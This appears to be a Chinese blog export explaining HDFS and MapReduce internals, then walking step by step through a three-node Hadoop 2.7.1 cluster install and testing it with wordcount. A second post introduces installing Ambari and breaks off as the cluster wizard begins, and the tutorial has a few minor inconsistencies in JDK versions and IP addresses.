&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;namenode：namenode负责管理文件目录、文件和block的对应关系以及block和datanode的对应关系。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SecondaryNameNode：分担namenode的工作量，是NameNode的冷备份，它的主要工作是合并fsimage（元数据镜像文件）和fsedits（元数据操作日志）然后再发给namenode。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;datanode：datanode就负责存储了，当然大部分容错机制都是在datanode上实现的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;rack 是指机柜的意思，一个block的三个副本通常会保存到两个或者两个以上的机柜中（当然是机柜中的服务器），这样做的目的是做防灾容错，因为发生一个机柜掉电或者一个机柜的交换机挂了的概率还是蛮高的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;几篇不错的文章 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;【Hadoop】HDFS的运行原理 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HDFS原理分析（一）—— 基本概念 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HDFS 原理、架构与特性介绍 5.HSDS写数据流程 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HDFS写文件流程 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Client向远程的Namenode发起RPC请求； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Namenode会检查要创建的文件是否已经存在，创建者是否有权限进行操作，成功则会为文件 创建一个记录，否则会让客户端抛出异常 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当客户端开始写入文件的时候，会将文件切分成多个packets，并向Namenode申请blocks，获取用来存储replicas的合适的datanodes列表，列表的大小根据在Namenode中对replication的设置而定。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;此时会形成一个pipline用来传输packet。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;packet以流的方式写入第一个datanode，该datanode把packet存储之后，再将其传递给下一个datanode，直到最后一个datanode。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最后一个datanode成功存储之后会返回一个ack 传递至客户端，在客户端，客户端确认ack后继续写入下一个packet。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果传输过程中，有某个datanode出现了故障，那么当前的pipeline会被关闭，出现故障的datanode会从当前的pipeline中移除，剩余的block会继续剩下的datanode中继续以pipeline的形式传输，同时Namenode会分配一个新的datanode，保持replicas设定的数量 6.HDFS 读数据流程 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HDFS读文件流程 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Client向远程的Namenode发起RPC请求 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Namenode会视情况返回文件的部分或者全部block列表，对于每个block，Namenode都会返回有该block拷贝的DataNode地址 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Client会选取离自己最接近的DataNode来读取block &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;读取完当前block的数据后，关闭与当前的DataNode连接，并为读取下一个block寻找最佳的DataNode &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当读完列表的block后，且文件读取还没有结束，client会继续向Namenode获取下一批的block列表 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;读取完block会进行checksum验证，如果读取datanode时出现错误，客户端会通知Namenode，然后再从下一个拥有该block拷贝的datanode继续读 7.mapreduce 详解MapReduce模型 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;MapReduce 是大规模数据（TB 级）计算的利器，Map 和Reduce 是它的主要思想，来源于函数式编程语言。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Map负责将数据打散，Reduce负责对数据进行聚集，用户只需要实现map 和reduce 两个接口，即可完成TB级数据的计算。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;常见的应用包括：日志分析和数据挖掘等数据分析应用。另外，还可用于科学数据计算，如圆周率PI 的计算等。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当我们提交一个计算作业时，MapReduce会首先把计算作业拆分成若干个Map 任务，然后分配到不同的节点上去执行，每一个Map 任务处理输入数据中的一部分，当Map 任务完成后，它会生成一些中间文件，这些中间文件将会作为Reduce 任务的输入数据。Reduce 任务的主要目标就是把前面若干个Map 的输出汇总到一起并输出 MapReduce 执行过程&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每个 Mapper 任务是一个 java 进程，它会读取 HDFS 中的文件，解析成很多的键值对，经过我们 map 方法处理后， 转换为很多的键值对再输出 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;把 Mapper 任务的运行过程分为六个阶段。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第一阶段是把输入文件按照一定的标准分片(InputSplit)，每个输入片的大小是固定的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第二阶段是对输入片中的记录按照一定的规则解析成键值对。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第三阶段是调用 Mapper 类中的 map 方法。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第四阶段是按照一定的规则对第三阶段输出的键值对进行分区。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第五阶段是对每个分区中的键值对进行排序。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第六阶段是对数据进行归纳处理，也就是 reduce 处理。键相等的键值对会调用一次reduce 方法。 Reducer任务的执行过程&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每个 Reducer 任务是一个 java 进程。Reducer 任务接收 Mapper 任务的输出，归约处理后写入到 HDFS 中。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以分为3个阶段 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第一阶段是 Reducer 任务会主动从 Mapper 任务复制其输出的键值对。 Mapper 任务可能会有很多，因此 Reducer 会复制多个 Mapper 的输出。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第二阶段是把复制到 Reducer 本地数据，全部进行合并，即把分散的数据合并成一个大的数据。再对合并后的数据排序。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第三阶段是对排序后的键值对调用 reduce 方法。 键相等的键值对调用一次 reduce 方法，每次调用会产生零个或者多个键值对。最后把这些输出的键值对写入到 HDFS 文件中。 8.安装 hadoop–准备工作&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;三台机器（内存大于2G） 分别写hosts、设定hostname。三台机器分别设置hostname 为master 、slave1、slave2。更改 hosts 1234567vim /etc/hosts``` ```bash192.168.0.87 master192.168.0.86 slave1192.168.0.85 slave2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;关闭selinux，关闭firewalld 123456789101112[root@master ~]# systemctl disable firewalldRemoved symlink /etc/systemd/system/dbus-org.fedoraproject.FirewallD1.service.Removed symlink /etc/systemd/system/basic.target.wants/firewalld.service.[root@master ~]# systemctl stop firewalld[root@master ~]# yum install -y iptables-services [root@master ~]# systemctl enable iptablesCreated symlink from /etc/systemd/system/basic.target.wants/iptables.service to /usr/lib/systemd/system/iptables.service.[root@master ~]# systemctl start iptables[root@master ~]# iptables -F[root@master ~]# service iptables saveiptables: Saving firewall rules to /etc/sysconfig/iptables:[ 确定 ] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上操作三台机器都需执行。 9.安装 hadoop–密钥认证&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;master可以通过密钥登陆本机和两台slave &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;master上生成密钥对： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ssh-keygen 一直回车 12345678910111213141516171819202122[root@master ~]# ssh-keygenGenerating public/private rsa key pair.Enter file in which to save the key (/root/.ssh/id_rsa): Created directory '/root/.ssh'.Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /root/.ssh/id_rsa.Your public key has been saved in /root/.ssh/id_rsa.pub.The key fingerprint is:29:86:0f:70:28:2b:0a:9e:9c:98:39:dc:d2:c2:5b:d4 root@masterThe key's randomart image is:+--[ RSA 2048]----+| || . ||. o . || o o.. . ||+ .oEo S ||Xo* + . ||*X + . || .= || . |+-----------------+ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;复制~/.ssh/id_rsa.pub 内容到本机和两台slave的 ~/.ssh/authorized_keys 12[root@master ~]# cat .ssh/id_rsa.pubssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDZfOQKxMrCOf95iZvdNkTg32nQeUp3rywF+d0SS+t5ccZ0YjbZUZVFOkh5Sg5gdsjLgJoduZDePtYYhbex1kKPs8E6cx073ZqpW37TBGObCv7Inz1Ks+TSplnw/AKH6uRTEswC5P2SD+mJ+iz+OTgsNJyrj+OGGH1gOhmzQuAznSChqkJaihNhcBOOuJf8rVqhmplN9YPuGBlGc3It6uFHZvw8C42bC7xyqobL3FRZwKw85WQ9ZjdPTKQzg5rcn76gCld9fRuWkL1ABbP6MRIawN5eonYMYVS05PUGVadHM+a9L5nwTAbA4YqGyQ0m37mHV+5BwaBHxQyY5RSIiiyH root@master 1[root@master ~]# vim .ssh/authorized_keys &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设置本机和两台slave机器上的~/.ssh/authorized_keys文件权限为600 1[root@master ~]# chmod 600 ~/.ssh/authorized_keys &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在master上 1234567891011121314[root@master ~]# ssh masterLast failed login: Tue Jan 10 16:58:22 CST 2017 from master on ssh:nottyThere were 8 failed login attempts since the last successful login.Last login: Tue Jan 10 16:53:03 2017 from 192.168.0.100[root@master ~]# 登出Connection to master closed.[root@master ~]# ssh slave1Last login: Tue Jan 10 16:52:18 2017 from master[root@slave1 ~]# 登出Connection to slave1 closed.[root@master ~]# ssh slave2Last login: Tue Jan 10 16:55:40 2017 from master[root@slave2 ~]# 登出Connection to slave2 closed. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以直接登陆 10.安装 hadoop –安装 JDK&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;hadoop2.7 需要安装jdk1.7版本 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下载地址http://www.oracle.com/technetwork/java/javase/downloads/jdk7-downloads-1880260.html &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解压压缩包 12[root@master ~]# tar zxvf jdk-8u111-linux-x64.tar.gz[root@master ~]# mv jdk1.8.0_111 /usr/local/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编写环境变量配置 1[root@master ~]# vim /etc/profile.d/java.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;写入 1234export JAVA_HOME=/usr/local/jdk1.7.0_79export CLASSPATH=.:$JAVA_HOME/jre/lib/rt.jar:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jarexport PATH=$PATH:$JAVA_HOME/bin 1[root@master ~]# source /etc/profile.d/java.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;java -version 查看是否生效 1234[root@master ~]# java -versionjava version "1.8.0_111"Java(TM) SE Runtime Environment (build 1.8.0_111-b14)Java HotSpot(TM) 64-Bit Server VM (build 25.111-b14, mixed mode) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;slave1 和 slave2 重复上面的操作 11.安装hadooop-安装 hadoop 包&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以下操作在master上执行 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下载地址 http://hadoop.apache.org/releases.html &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;镜像站 http://mirror.bit.edu.cn/apache/hadoop/common/hadoop-2.7.1/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下载2.7.1 binary版本 1wget http://mirror.bit.edu.cn/apache/hadoop/common/hadoop-2.7.1/hadoop-2.7.1.tar.gz &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解压 tar zxf hadoop-2.7.1.tar.gz 1234567[root@master ~]# tar zxf hadoop-2.7.1.tar.gz[root@master ~]# mv hadoop-2.7.1 /usr/local/hadoop[root@master ~]# cd /usr/local/hadoop[root@master hadoop]# mkdir tmp dfs dfs/data dfs/name[root@master hadoop]# lsbin etc lib LICENSE.txt README.txt sharedfs include libexec NOTICE.txt sbin tmp &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;把/usr/local/hadoop 目录分别拷贝至两个slave上 12[root@master hadoop]# rsync -av /usr/local/hadoop slave1:/usr/local/[root@master hadoop]# rsync -av /usr/local/hadoop slave2:/usr/local/ 12.安装 hadoop -配置 hadoop&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;master上 vim /usr/local/hadoop/etc/hadoop/core-site.xml 1[root@master hadoop]# vim /usr/local/hadoop/etc/hadoop/core-site.xml 1234567891011121314&lt;configuration&gt; &lt;property&gt; &lt;name&gt;fs.defaultFS&lt;/name&gt; &lt;value&gt;hdfs://192.168.0.87:9000&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;hadoop.tmp.dir&lt;/name&gt; &lt;value&gt;file:/usr/local/hadoop/tmp&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;io.file.buffer.size&lt;/name&gt; &lt;value&gt;131702&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;master上 vim /usr/local/hadoop/etc/hadoop/hdfs-site.xml 1[root@master hadoop]# vim /usr/local/hadoop/etc/hadoop/hdfs-site.xml 12345678910111213141516171819202122&lt;configuration&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.name.dir&lt;/name&gt; &lt;value&gt;file:/usr/local/hadoop/dfs/name&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.datanode.data.dir&lt;/name&gt; &lt;value&gt;file:/usr/local/hadoop/dfs/data&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.replication&lt;/name&gt; &lt;value&gt;2&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.secondary.http-address&lt;/name&gt; &lt;value&gt;192.168.0.87:9001&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.webhdfs.enabled&lt;/name&gt; &lt;value&gt;true&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;master上 vim /usr/local/hadoop/etc/hadoop/mapred-site.xml 12[root@master hadoop]# mv /usr/local/hadoop/etc/hadoop/mapred-site.xml.template /usr/local/hadoop/etc/hadoop/mapred-site.xml[root@master hadoop]# vim /usr/local/hadoop/etc/hadoop/mapred-site.xml 1234567891011121314&lt;configuration&gt; &lt;property&gt; &lt;name&gt;mapreduce.framework.name&lt;/name&gt; &lt;value&gt;yarn&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;mapreduce.jobhistory.address&lt;/name&gt; &lt;value&gt;172.7.15.113:10020&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;mapreduce.jobhistory.webapp.address&lt;/name&gt; &lt;value&gt;192.168.0.87:19888&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;master上 vim /usr/local/hadoop/etc/hadoop/yarn-site.xml 1[root@master hadoop]# vim /usr/local/hadoop/etc/hadoop/yarn-site.xml 12345678910111213141516171819202122232425262728293031323334&lt;configuration&gt; &lt;property&gt; &lt;name&gt;yarn.nodemanager.aux-services&lt;/name&gt; &lt;value&gt;mapreduce_shuffle&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;yarn.nodemanager.auxservices.mapreduce.shuffle.class&lt;/name&gt; &lt;value&gt;org.apache.hadoop.mapred.ShuffleHandler&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.address&lt;/name&gt; &lt;value&gt;192.168.0.87:8032&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.scheduler.address&lt;/name&gt; &lt;value&gt;192.168.0.87:8030&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.resource-tracker.address&lt;/name&gt; &lt;value&gt;192.168.0.87:8031&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.admin.address&lt;/name&gt; &lt;value&gt;192.168.0.87:8033&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.webapp.address&lt;/name&gt; &lt;value&gt;192.168.0.87:8088&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;yarn.nodemanager.resource.memory-mb&lt;/name&gt; &lt;value&gt;2048&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以下在master上操作 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;更改JAVA_HOME 12[root@master hadoop]# cd /usr/local/hadoop/etc/hadoop[root@master hadoop]# vim hadoop-env.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;改为 1export JAVA_HOME=/usr/local/jdk1.8.0_111 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;更改JAVA_HOME 1[root@master hadoop]# vim yarn-env.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;改为 1export JAVA_HOME=/usr/local/jdk1.8.0_111 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;slaves 文件修改 1[root@master hadoop]# vim slaves 12192.168.0.86192.168.0.85 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将master上的etc目录同步至两个slave 1234567891011121314151617181920212223242526[root@master hadoop]# rsync -av /usr/local/hadoop/etc/ slave1:/usr/local/hadoop/etc/sending incremental file listhadoop/hadoop/core-site.xmlhadoop/hadoop-env.shhadoop/hdfs-site.xmlhadoop/mapred-site.xmlhadoop/slaveshadoop/yarn-env.shhadoop/yarn-site.xml sent 6527 bytes received 269 bytes 13592.00 bytes/sectotal size is 79165 speedup is 11.65[root@master hadoop]# rsync -av /usr/local/hadoop/etc/ slave2:/usr/local/hadoop/etc/sending incremental file listhadoop/hadoop/core-site.xmlhadoop/hadoop-env.shhadoop/hdfs-site.xmlhadoop/mapred-site.xmlhadoop/slaveshadoop/yarn-env.shhadoop/yarn-site.xml sent 6527 bytes received 269 bytes 13592.00 bytes/sectotal size is 79165 speedup is 11.65 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;启动 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在master上操作即可，两个slave会自动启动 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;初始化 123[root@master hadoop]# /usr/local/hadoop/bin/hdfs namenode -format[root@master hadoop]# echo $?0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;启动服务 123456789101112[root@master hadoop]# /usr/local/hadoop/sbin/start-all.shThis script is Deprecated. Instead use start-dfs.sh and start-yarn.shStarting namenodes on [master]master: starting namenode, logging to /usr/local/hadoop/logs/hadoop-root-namenode-master.out192.168.0.85: starting datanode, logging to /usr/local/hadoop/logs/hadoop-root-datanode-slave2.out192.168.0.86: starting datanode, logging to /usr/local/hadoop/logs/hadoop-root-datanode-slave1.outStarting secondary namenodes [master]master: starting secondarynamenode, logging to /usr/local/hadoop/logs/hadoop-root-secondarynamenode-master.outstarting yarn daemonsstarting resourcemanager, logging to /usr/local/hadoop/logs/yarn-root-resourcemanager-master.out192.168.0.85: starting nodemanager, logging to /usr/local/hadoop/logs/yarn-root-nodemanager-slave2.out192.168.0.86: starting nodemanager, logging to /usr/local/hadoop/logs/yarn-root-nodemanager-slave1.out &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;停止服务 12345678910111213[root@master hadoop]# /usr/local/hadoop/sbin/stop-all.shThis script is Deprecated. Instead use stop-dfs.sh and stop-yarn.shStopping namenodes on [master]master: stopping namenode192.168.0.85: stopping datanode192.168.0.86: stopping datanodeStopping secondary namenodes [master]master: stopping secondarynamenodestopping yarn daemonsstopping resourcemanager192.168.0.85: no nodemanager to stop192.168.0.86: no nodemanager to stopno proxyserver to stop &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;访问 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;浏览器打开http://192.168.0.87:8088 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;浏览器打开http://192.168.0.87:50070 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也可以在 master、slave1、slave2 上执行命令 1[root@master hadoop]# ps aux |grep java 123456789[root@master hadoop]# netstat -lnp |grep javatcp 0 0 0.0.0.0:50070 0.0.0.0:* LISTEN 3626/java tcp 0 0 192.168.0.87:9000 0.0.0.0:* LISTEN 3626/java tcp 0 0 192.168.0.87:9001 0.0.0.0:* LISTEN 3820/java tcp6 0 0 192.168.0.87:8088 :::* LISTEN 3985/java tcp6 0 0 192.168.0.87:8030 :::* LISTEN 3985/java tcp6 0 0 192.168.0.87:8031 :::* LISTEN 3985/java tcp6 0 0 192.168.0.87:8032 :::* LISTEN 3985/java tcp6 0 0 192.168.0.87:8033 :::* LISTEN 3985/java 13.测试 hadoop&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以下操作在master上实现 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;建立测试目录 12345[root@master hadoop]# cd /usr/local/hadoop[root@master hadoop]# bin/hdfs dfs -mkdir /123[root@master hadoop]# bin/hdfs dfs -ls /Found 1 itemsdrwxr-xr-x - root supergroup 0 2017-01-11 17:22 /123 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果提示 1copyFromLocal: Cannot create directory /123/. Name node is in safe mode. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这是因为开启了安全模式，解决办法 1[root@master hadoop]# bin/hdfs dfsadmin -safemode leave &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将当前目录下的LICENSE.txt复制到hadopp中，查看/123/下有哪些文件 bin/hdfs dfs -ls /123 1234[root@master hadoop]# bin/hdfs dfs -copyFromLocal ./LICENSE.txt /123 [root@master hadoop]# bin/hdfs dfs -ls /123Found 1 items-rw-r--r-- 2 root supergroup 15429 2017-01-11 17:29 /123/LICENSE.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用wordcount分析LICENSE.txt 1[root@master hadoop]# bin/hadoop jar ./share/hadoop/mapreduce/hadoop-mapreduce-examples-2.7.1.jar wordcount /123/LICENSE.txt /output/123 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;bin/hdfs dfs -ls /output/123 查看分析后的文件 1234[root@master hadoop]# bin/hdfs dfs -ls /output/123Found 2 items-rw-r--r-- 2 root supergroup 0 2017-01-11 17:47 /output/123/_SUCCESS-rw-r--r-- 2 root supergroup 8006 2017-01-11 17:47 /output/123/part-r-00000 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;bin/hdfs dfs -cat /output/123/part-r-00000 查看分析结果 1[root@master hadoop]# bin/hdfs dfs -cat /output/123/part-r-00000]]></content>
      <tags>
        <tag>Hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ambari——大数据平台的搭建利器]]></title>
    <url>%2F2017%2F08%2F18%2FHadoop%2F3.%20Ambari%E2%80%94%E2%80%94%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E7%9A%84%E6%90%AD%E5%BB%BA%E5%88%A9%E5%99%A8%2F</url>
    <content type="text"><![CDATA[Ambari——大数据平台的搭建利器&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;虽然大数据越来越流行，但其学习的门槛却一直阻碍着很多的分布式应用初学者或者大数据的业务应用开发者。多个产品之间的不兼容问题，快速集成和维护也显得比较困难。不管是 Hadoop V1 或者 V2 的安装，又或者 Spark/YARN 等的集成，都不是几行简单的命令可以完成的，而是需要手工修改很多的集群配置，这进一步增加了业务开发者的学习和使用难度。有了 Ambari，这些都不再是难题。 Ambari 是什么&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Ambari 跟 Hadoop 等开源软件一样，也是 Apache Software Foundation 中的一个项目，并且是顶级项目。目前最新的发布版本是 2.0.1，未来不久将发布 2.1 版本。就 Ambari 的作用来说，就是创建、管理、监视 Hadoop 的集群，但是这里的 Hadoop 是广义，指的是 Hadoop 整个生态圈（例如 Hive，Hbase，Sqoop，Zookeeper 等），而并不仅是特指 Hadoop。用一句话来说，Ambari 就是为了让 Hadoop 以及相关的大数据软件更容易使用的一个工具。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说到这里，大家就应该明白什么人最需要 Ambari 了。那些苦苦花费好几天去安装、调试 Hadoop 的初学者是最能体会到 Ambari 的方便之处的。而且，Ambari 现在所支持的平台组件也越来越多，例如流行的 Spark，Storm 等计算框架，以及资源调度平台 YARN 等，我们都能轻松地通过 Ambari 来进行部署。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Ambari 自身也是一个分布式架构的软件，主要由两部分组成：Ambari Server 和 Ambari Agent。简单来说，用户通过 Ambari Server 通知 Ambari Agent 安装对应的软件；Agent 会定时地发送各个机器每个软件模块的状态给 Ambari Server，最终这些状态信息会呈现在 Ambari 的 GUI，方便用户了解到集群的各种状态，并进行相应的维护。详细的操作和介绍会在后续章节介绍。 Ambari 的安装安装准备&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;关于 Ambari 的安装，目前网上能找到两个发行版，一个是 Apache 的 Ambari，另一个是 Hortonworks 的，两者区别不大。这里就以 Apache 的 Ambari 2.0.1 作为示例。本文使用三台 Redhat 6.6 作为安装环境（目前测试验证结果为 Ambari 在 Redhat 6.6 的版本上运行比较稳定），三台机器分别为 zwshen37.example.com、zwshen38.example.com、zwshen39.example.com。zwshen37 计划安装为 Ambari 的 Server，另外两台为 Ambari Agent。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装 Ambari 最方便的方式就是使用公共的库源（public repository）。有兴趣的朋友可以自己研究一下搭建一个本地库（local repository）进行安装。这个不是重点，所以不在此赘述。在进行具体的安装之前，需要做几个准备工作。 1. SSH 的无密码登录；&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Ambari 的 Server 会 SSH 到 Agent 的机器，拷贝并执行一些命令。因此我们需要配置 Ambari Server 到 Agent 的 SSH 无密码登录。在这个例子里，zwshen37 可以 SSH 无密码登录 zwshen38 和 zwshen39。 2. 确保 Yum 可以正常工作；&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过公共库（public repository），安装 Hadoop 这些软件，背后其实就是应用 Yum 在安装公共库里面的 rpm 包。所以这里需要您的机器都能访问 Internet。 3. 确保 home 目录的写权限。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Ambari 会创建一些 OS 用户。 4. 确保机器的 Python 版本大于或等于 2.6.（Redhat6.6，默认就是 2.6 的）。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上的准备工作完成后，便可以真正的开始安装 Ambari 了。 安装过程&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先需要获取 Ambari 的公共库文件（public repository）。登录到 Linux 主机并执行下面的命令（也可以自己手工下载）： 1wget http://public-repo-1.hortonworks.com/ambari/centos6/2.x/updates/2.0.1/ambari.repo &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将下载的 ambari.repo 文件拷贝到 Linux 的系统目录/etc/yum.repos.d/。拷贝完后，我们需要获取该公共库的所有的源文件列表。依次执行以下命令。 12yum clean allyum list|grep ambari &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如图 1 所示： 图 1. 获取公共库源文件列表 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果可以看到 Ambari 的对应版本的安装包列表，说明公共库已配置成功。然后就可以安装 Ambari 的 package 了。执行下面的命令安装 Ambari Server 到该机器。 1yum install ambari-server &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;待安装完成后，便需要对 Ambari Server 做一个简单的配置。执行下面的命令。 1amari-server setup &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在这个交互式的设置中，采用默认配置即可。Ambari 会使用 Postgres 数据库，默认会安装并使用 Oracle 的 JDK。默认设置了 Ambari GUI 的登录用户为 admin/admin。并且指定 Ambari Server 的运行用户为 root。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;简单的 setup 配置完成后。就可以启动 Ambari 了。运行下面的命令。 1ambari-server start &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当成功启动 Ambari Server 之后，便可以从浏览器登录，默认的端口为 8080。以本文环境为例，在浏览器的地址栏输入 http://zwshen37.example.com:8080，登录密码为 admin/admin。登入 Ambari 之后的页面如下图。 图 2. Ambari 的 welcome 页面 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;至此，Ambari Server 就安装完成了。 部署一个 Hadoop2.x 集群&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;到这一节，我们将可以真正地体验到 Ambari 的用武之地，以及它所能带来的方便之处。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;登录 Ambari 之后，点击按钮“Launch Install Wizard”，就可以开始创建属于自己的大数据平台。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第一步，命名集群的名字。本环境为 bigdata。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第二步，选择一个 Stack，这个 Stack 相当于一个 Hadoop 生态圈软件的集合。Stack 